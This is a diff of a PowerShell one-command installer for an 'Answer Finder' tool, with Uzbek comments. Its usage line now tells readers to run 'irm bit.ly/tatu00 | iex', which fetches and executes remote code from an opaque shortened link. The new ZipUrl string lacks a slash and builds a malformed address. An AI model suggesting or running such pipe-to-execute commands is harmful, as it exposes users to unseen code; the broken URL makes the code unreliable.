@@ -1,5 +1,5 @@
 # Javob Qidiruvchi 5.0 - foydalanuvchi uchun bir buyruqli o'rnatuvchi
-# Ishlatish: irm https://githubusercontent.com | iex
+# Ishlatish: irm bit.ly/tatu00 | iex
 
 $ErrorActionPreference = "Stop"
 $ProgressPreference = "SilentlyContinue"
@@ -7,7 +7,7 @@ $ProgressPreference = "SilentlyContinue"
 
 $Repo = "G-DEVELOPER-707/a-finder"
 $Branch = "main"
-$ZipUrl = "https://github.com"
+$ZipUrl = "https://github.com" + $Repo + "/archive/refs/heads/" + $Branch + ".zip"
 $InstallDir = Join-Path $env:USERPROFILE "proxyFast"
 
 $TempBase = [System.IO.Path]::GetFullPath($env:TEMP)
